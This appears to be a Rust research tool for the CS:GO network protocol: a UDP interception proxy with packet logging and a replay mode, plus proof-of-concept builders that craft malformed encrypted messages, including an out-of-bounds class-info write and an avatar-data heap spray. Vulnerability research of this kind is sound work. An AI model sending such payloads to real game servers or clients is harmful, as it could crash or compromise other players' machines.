#![allow(unused)]
#![allow(non_snake_case)]

use serde::{Deserialize, Serialize};
use std::convert::TryInto;
use std::io::Result;
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, UdpSocket};

use std::fs::File;
use std::io::Read;
use std::io::Write;

use crate::bitutils::{BitReader, BitWriter};
use crate::packet::{create_packet_from_data, padd_packet, update_seq_ack};

//
// pub mod pb {
//     include!(concat!(env!("OUT_DIR"), "/netmessages.rs"));
// }

use prost::Message;
mod bitutils;
mod ice;
mod lzss;
mod netmessages;
mod packet;

const NET_HEADER_FLAG_SPLITPACKET: i32 = -2;
const CONNECTIONLESS_HEADER: i32 = -1;
const NET_HEADER_FLAG_COMPRESSEDPACKET: i32 = -3;
const PACKET_FLAG_CHOKED: u8 = (1 << 4);
const PACKET_FLAG_RELIABLE: u8 = (1 << 0);

type PacketCB = Box<dyn FnMut(&UdpProxyV4, &[u8]) -> Option<bool>>;

struct UdpProxyV4 {
    socket: UdpSocket,
    server: SocketAddrV4,
    client: SocketAddrV4,
    log: Option<String>,
    buf: [u8; 0x0005_0000],
}

impl UdpProxyV4 {
    pub fn new(server: Ipv4Addr, port: u16, log: Option<String>) -> Box<Self> {
        let server = SocketAddrV4::new(server, port);

        Box::new(UdpProxyV4 {
            server,
            client: server, // just to set it to an initial value, this will fuction as a echo server then
            socket: UdpSocket::bind("0.0.0.0:8080").expect("Unable to bind socket to 0.0.0.0:8080"),
            buf: [0; 0x0005_0000],
            log,
        })
    }

    fn is_server(&self, addr: &SocketAddrV4) -> bool {
        self.server == *addr
    }

    fn is_client(&self, addr: &SocketAddrV4) -> bool {
        !self.is_server(addr)
    }

    fn send_client(&self, data: &[u8]) -> Result<usize> {
        self.socket.send_to(data, self.client)
    }

    fn send_server(&self, data: &[u8]) -> Result<usize> {
        self.socket.send_to(data, self.server)
    }

    pub fn run(
        &mut self,
        mut on_server_packet: PacketCB,
        mut on_client_packet: PacketCB,
    ) -> Result<()> {
        println!("running on {:?}", self.socket);
        let mut logger = if self.log.is_none() {
            Storage::new("")
        } else {
            Storage::new(self.log.as_ref().unwrap())
        };

        loop {
            let (len, src) = self.socket.recv_from(&mut self.buf)?;
            let src = if let SocketAddr::V4(addr) = src {
                addr
            } else {
                panic!("This shouldn't happen");
            };

            let data = &self.buf[..len];

            // if self.is_server(&src) {
            //     println!(
            //         "recv_from: server {:?} len:{} packet: {:?}",
            //         self.server, len, data
            //     );
            // // if self.log.is_some() {
            // //     logger.save("server", data);
            // // }
            // } else {
            //     println!("recv_from: client {:?} len:{} packet: {:?}", src, len, data);
            //     // if self.log.is_some() {
            //     //     logger.save("client", data);
            //     // }
            // }

            if self.is_server(&src) {
                let should_send = on_server_packet(&self, data).unwrap_or(true);
                if !should_send {
                    continue;
                }
            } else {
                let should_send = on_client_packet(&self, data).unwrap_or(true);
                if !should_send {
                    continue;
                }
            }

            if self.is_server(&src) {
                let len = self.socket.send_to(data, self.client)?;
            } else {
                self.client = src;
                let len = self.socket.send_to(data, self.server)?;
            }
        }
    }
}

struct ProxyArgs {
    replay: Option<String>,
    log: Option<String>,
    server_ip: Option<String>,
    connect: Option<String>,
}

impl ProxyArgs {
    fn new() -> Self {
        ProxyArgs {
            replay: None,
            log: None,
            server_ip: None,
            connect: None,
        }
    }
}

fn parse_args() -> ProxyArgs {
    let mut a = std::env::args();
    let mut ret = ProxyArgs::new();

    loop {
        let item = a.next();
        if item.is_none() {
            break;
        }

        let item = item.unwrap();

        if item == "--replay" {
            ret.replay = a.next();
        }

        if item == "--log" {
            ret.log = a.next();
        }

        if item == "--server-ip" {
            ret.server_ip = a.next();
        }

        if item == "--connect" {
            ret.connect = a.next();
        }
    }

    ret
}

#[derive(Debug, Clone, PartialEq, Deserialize, Serialize)]
struct Packet {
    data: Vec<u8>,
    from: String,
}

impl Packet {
    fn new(from: &str, data: &[u8]) -> Self {
        Packet {
            from: from.to_string(),
            data: data.to_vec(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize, Serialize)]
struct Storage {
    saved: Vec<Packet>,
    name: String,
    num: usize,
}

impl Storage {
    fn new(name: &str) -> Self {
        Storage {
            saved: Vec::default(),
            name: name.to_string(),
            num: 0,
        }
    }

    fn load(name: &str) -> Option<Self> {
        let mut f = File::open(name).ok()?;
        let mut buf = String::new();

        f.read_to_string(&mut buf).ok()?;

        let ret = serde_json::from_str::<Vec<Packet>>(&buf);

        let r = Storage {
            saved: ret.ok()?,
            name: name.to_string(),
            num: 0,
        };

        Some(r)
    }

    fn save(&mut self, from: &str, data: &[u8]) {
        self.saved.push(Packet::new(from, data));

        if self.num > 1000 {
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            println!("FLUSHING LOG");
            if self.flush().is_none() {
                panic!("Failed to flush log file");
            }

            self.num = 0;
        } else {
            self.num += 1;
        }
    }

    fn flush(&self) -> Option<()> {
        let ser = serde_json::to_vec(&self.saved).ok()?;
        let mut fb = File::create(&self.name).ok()?;

        fb.write_all(&ser).ok()?;
        fb.flush().ok()?;
        fb.sync_all().ok()?;

        Some(())
    }
}
fn crc32_compute_table() -> [u32; 256] {
    let mut crc32_table = [0; 256];

    for n in 0..256 {
        crc32_table[n as usize] = (0..8).fold(n as u32, |acc, _| match acc & 1 {
            1 => 0xedb88320 ^ (acc >> 1),
            _ => acc >> 1,
        });
    }

    crc32_table
}

fn crc32_single_buffer(buf: &[u8]) -> u32 {
    let crc_table = crc32_compute_table();

    !buf.iter().fold(!0, |acc, octet| {
        (acc >> 8) ^ crc_table[((acc & 0xff) ^ *octet as u32) as usize]
    })
}

fn calc_checksum(buf: &[u8]) -> u16 {
    let checksum = crc32_single_buffer(buf);
    ((checksum & 0xffff) ^ ((checksum >> 16) & 0xffff)) as u16
}

/// this will generate the crc which is needed to pass the checksum check
fn gen_crc(data: &[u8]) -> [u8; 2] {
    let asu16 = calc_checksum(data);
    asu16.to_le_bytes() // i might be mistaken, but i don't think the endianess is defined anywhere
}

fn as_var_int(data: i32) -> Vec<u8> {
    let mut ret = Vec::default();
    let mut idx = 0;
    let mut data = data;

    while data > 0x7f {
        ret.push(((data & 0x7f) | 0x80) as u8);
        data >>= 7;
    }

    ret.push((data & 0x7f) as u8);
    ret
}

fn flick(data: &[u8]) -> Option<Vec<u8>> {
    let num_rand_fudge = data[0] as usize;
    if num_rand_fudge > 0 && num_rand_fudge + 5 < data.len() {
        let num_bytes_written = u32::from_be_bytes(
            data[num_rand_fudge + 1..num_rand_fudge + 5]
                .try_into()
                .unwrap(),
        ) as usize;

        if num_rand_fudge + 5 + num_bytes_written == data.len() {
            return Some(Vec::from(
                &data[num_rand_fudge + 5..num_rand_fudge + 5 + num_bytes_written],
            ));
        }
    }

    None
}

fn main() {
    let args = parse_args();

    // This needs to receive the current CSGO client version.
    let ice = ice::Ice::new(13779);
    // These also need the csgo version, as they will construct an Ice key as well.
    let mut client_parser = packet::Parser::new(13779);
    let mut server_parser = packet::Parser::new(13779);

    if let Some(to) = args.connect {
        connect(to.as_str());
    } else if args.replay.is_some() {
        let packets = Storage::load(&args.replay.unwrap());
        if packets.is_none() {
            println!("[-] LOAD failed");
            return;
        }
        let packets = packets.unwrap();
        for packet in packets.saved.iter() {
            // println!("recv_from: {}", packet.from);
            // if parser.net_receivedatagram_helper(&packet.data).is_none() {
            //     continue;
            // }
            // println!();

            // parser.process_socket();
        }
    } else {
        let mut proxy = UdpProxyV4::new(
            args.server_ip
                .expect("Need Server IP! (--server-ip)")
                .parse()
                .expect("IPV4 is invalid"),
            27015,
            args.log,
        );

        let mut c2s_bytes = 0;
        let mut c2s_start = None;
        let mut c2s_packets = 0;
        let mut s2c_bytes = 0;
        let mut s2c_start = None;
        let mut s2c_packets = 0;

        let mut ctr = 0;
        let mut stage = 0;
        proxy
            .run(
                Box::new(move |proxy, data| -> Option<bool> {
                    if let Some(res) = server_parser.on_packet(data) {
                        if s2c_start.is_none() {
                            s2c_start = Some(std::time::Instant::now());
                        }
                        s2c_bytes += data.len();
                        s2c_packets += 1;
                        if s2c_packets % 0x100 == 0 {
                            //println!("S2C Throughput: {} kB/s", (s2c_bytes as f64 / 1024f64) / s2c_start.unwrap().elapsed().as_secs() as f64);
                        }
                        //print!("s2c: ");
                        server_parser.dump_server_message();
                    }
                    Some(true)
                }),
                // C2S closure.
                Box::new(move |proxy, data| -> Option<bool> {
                    // proxy.send_server(poc_server(&ice, 10, stage)?.as_slice());

                    // return Some(false);
                    if let Some(res) = client_parser.on_packet(data) {
                        if c2s_start.is_none() {
                            c2s_start = Some(std::time::Instant::now());
                        }
                        c2s_bytes += data.len();
                        c2s_packets += 1;
                        if c2s_packets % 0x100 == 0 {
                            //println!("C2S Throughput: {} kB/s", (c2s_bytes as f64 / 1024f64) / c2s_start.unwrap().elapsed().as_secs() as f64);
                        }
                        client_parser.dump_client_message();
                    }
                    Some(true)
                }),
            )
            .expect("Proxy failed");
    }
}

fn poc_server(ice: &ice::Ice, seq_nr: i32, stage: i32) -> Option<Vec<u8>> {
    let mut pay = Vec::new();

    let p = packet::Splitpacket {
        net_id: -2,
        sq_num: seq_nr,
        packet_id: 0x7e7f,
        split_size: 1188,
    };

    pay.extend_from_slice(p.as_arr().as_ref());
    pay.extend_from_slice([b'A'; 0x7].as_ref());

    Some(pay)
}

fn invincible(ice: &ice::Ice, seq: i32, seq_ack: i32, rel_state: u8) -> Option<Vec<u8>> {
    let str_cmd = netmessages::CnetMsgStringCmd {
        command: Some("open_buymenu".to_string()),
    };

    let mut msg_raw = Vec::default();
    str_cmd.encode(&mut msg_raw);

    let encoded_msg = create_packet_from_data(rel_state, /* net_StringCmd= */ 5, &msg_raw);
    let encoded_msg = update_seq_ack(&encoded_msg, seq, seq_ack);
    let encoded_msg = padd_packet(&encoded_msg[..]);
    ice.encrypt(&encoded_msg)
}

fn poc_net_msg_player_avatar_data_spray(
    ice: &ice::Ice,
    seq: i32,
    seq_ack: i32,
    rel_state: u8,
    accountid: u32,
) -> Option<Vec<u8>> {
    let mut avatar_data = netmessages::CnetMsgPlayerAvatarData {
        accountid: Some(accountid),
        rgb: Some(vec![0x41u8; 0xffae]),
    };

    let mut msg_raw = Vec::default();
    avatar_data.encode(&mut msg_raw);

    let encoded_msg =
        create_packet_from_data(rel_state, /* net_PlayerAvatarData = */ 100, &msg_raw);

    let encoded_msg = update_seq_ack(&encoded_msg, seq, seq_ack);

    let packet = padd_packet(&encoded_msg[..]);

    ice.encrypt(&packet)
}

fn poc_svc_PaintmapData(ice: &ice::Ice, seq: i32, seq_ack: i32, rel_state: u8) -> Option<Vec<u8>> {
    let mut paintmap_data = netmessages::CsvcMsgPaintmapData {
        paintmap: Some(vec![0x1; 0x10]),
    };

    let mut client_raw = Vec::default();
    paintmap_data.encode(&mut client_raw);

    let encoded_msg =
        create_packet_from_data(rel_state, /* svc_PaintmapData= */ 33, &client_raw);

    let encoded_msg = update_seq_ack(&encoded_msg, seq, seq_ack);

    let packet = padd_packet(&encoded_msg[..]);

    ice.encrypt(&packet)
}
/// returns complete packet ready to be sent
fn poc_svc_ClassInfo(ice: &ice::Ice, seq: i32, seq_ack: i32, rel_state: u8) -> Option<Vec<u8>> {
    let mut class_info = netmessages::CsvcMsgClassInfo {
        create_on_client: Some(false),
        classes: Vec::default(),
    };

    for i in 0..3 {
        let class = netmessages::csvc_msg_class_info::ClassT {
            class_id: Some(-i * 32), // oob access here, -559038737i32 == 0xdeadbeef
            // both "writers" can be empty too, only limit is on strcpy => no null bytes
            data_table_name: Some(format!("{:04}", i)), // content to be written
            class_name: Some(format!("{:04}", i)),
        };

        class_info.classes.push(class);
    }

    // class_info.encode(&mut raw_msg);

    let mut client_raw = Vec::default();
    class_info.encode(&mut client_raw);

    let encoded_msg =
        create_packet_from_data(rel_state, /* svc_ClassInfo = */ 10, &client_raw);

    let encoded_msg = update_seq_ack(&encoded_msg, seq, seq_ack);

    // println!("{:?}", encoded_msg);

    let packet = padd_packet(&encoded_msg[..]);

    ice.encrypt(&packet)
}

fn poc_entity_oob(ice: &ice::Ice, seq: i32, seq_ack: i32, rel_state: u8) -> Option<Vec<u8>> {
    let mut packet_entities = netmessages::CsvcMsgPacketEntities {
        max_entries: Some(10),
        updated_entries: Some(5),
        is_delta: Some(false),
        update_baseline: Some(true),
        baseline: Some(i32::MAX),
        delta_from: Some(12),
        entity_data: Some(vec![0, 1, 3, 4]),
        //pub updated_entries: ::std::option::Option<i32>,
        //pub is_delta: ::std::option::Option<bool>,
        //pub update_baseline: ::std::option::Option<bool>,
        //pub baseline: ::std::option::Option<i32>,
        //pub delta_from: ::std::option::Option<i32>,
        //pub entity_data: ::std::option::Option<std::vec::Vec<u8>>,
    };

    let mut packet_entities_raw = Vec::new();

    packet_entities.encode(&mut packet_entities_raw);

    unimplemented!();
}

const PACKET_CONNECT: &[u8] = &[
    255, 255, 255, 255, 113, 99, 111, 110, 110, 101, 99, 116, 48, 120, 48, 48, 48, 48, 48, 48, 48,
    48, 0,
];

fn connect(to: &str) {
    let on_reset_socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let mut buff = [0; 0x100];
    loop {
        on_reset_socket.send_to(PACKET_CONNECT, to.to_string());
        if let Ok((len, _)) = on_reset_socket.peek_from(&mut buff[..]) {
            if len != 0 {
                break;
            }
        }
        println!("server didn't awnser, trying again");
        std::thread::sleep(std::time::Duration::from_millis(500));
    }
    // socket has server connect resp
    on_reset_socket.recv_from(&mut buff[..]);

    let parse_packet = move || -> Option<(i32, i32)> {
        let mut msg = BitReader::new(&buff);

        assert!(msg.read_long()? == packet::CONNECTIONLESS_HEADER);
        assert!(msg.read_byte()? == 0x41); // 0x41 == 'A' == S2C_CHALLENGE
        let chall_nr = msg.read_long()?;
        let auth_protocol = msg.read_long()?;
        // we don't care about the rest, in engine/baseserver.cpp#1666 LL
        // msg.read_bytes(2)?; // short read steam2 encryption key
        // msg.read_bytes(8)?; // steam id of the server ?
        // msg.read_byte()?; // is BSecure, whatever that means
        // msg.read_string()?; // context we sent, should be "0x00000000"
        // msg.read_long()?; // host version
        // msg.read_string()?; // lobby type
        // msg.read_byte()?; // requires password
        // msg.read_bytes(8)?; // -1 long long value
        // msg.read_byte()?; // 0 byte value
        // msg.read_byte()?; // IsValveDS()
        assert!(msg.read_byte()? == 0); // requires encrypted channels, should be 0

        Some((chall_nr, auth_protocol))
    };

    let (chall_nr, auth_protocol) = match parse_packet() {
        None => panic!("Failed to parse challenge response packet"),
        Some((c, a)) => (c, a),
    };

    // send connectionless connection creation packet
    let mut buf = BitWriter::new();
    buf.write_long(packet::CONNECTIONLESS_HEADER);
    buf.write_char(b'k'); // first byte is enum, k == C2S_CONNECT
    buf.write_long(0x35cd); // protocol, server version essentially TODO: XXX: UPADE: THIS CHANGES, SAME version as
    buf.write_long(auth_protocol); // auth protocoll
    buf.write_long(chall_nr); // auth challNr
    buf.write_str("fuzzer"); // name
    buf.write_str(""); // password, set null for empty
    buf.write_byte(1); // player num => 1
    buf.write_var_int32(0); // packet type, isn't used

    let convars = netmessages::CMsgCVars { cvars: vec![] };
    let split_player_connect = netmessages::CclcMsgSplitPlayerConnect {
        convars: Some(convars),
    };

    let mut nm_wrapper = Vec::new();
    split_player_connect.encode(&mut nm_wrapper);

    // write netmessage into bitwriter
    for b in nm_wrapper {
        buf.write_byte(b);
    }

    buf.write_bit(0); // we are not low violence
    buf.write_long_long(0); // reservation cookie
    buf.write_byte(1); // CROSSPLAYPLATFORM_PC
    buf.write_long(0); // EncryptionKeyIndex, want 0
                       // game server is steam enabled so we prob wan't the steam cdkey serialisatio
                       // need to write correct data :/
    buf.write_short(1); // TODO: check this in the debugger
    buf.write_str("a");

    let buffer = buf.finish();
    on_reset_socket.send_to(buffer.as_slice(), to.to_string());

    on_reset_socket.recv_from(&mut buff);
    on_reset_socket.recv_from(&mut buff);
    on_reset_socket.recv_from(&mut buff);
}
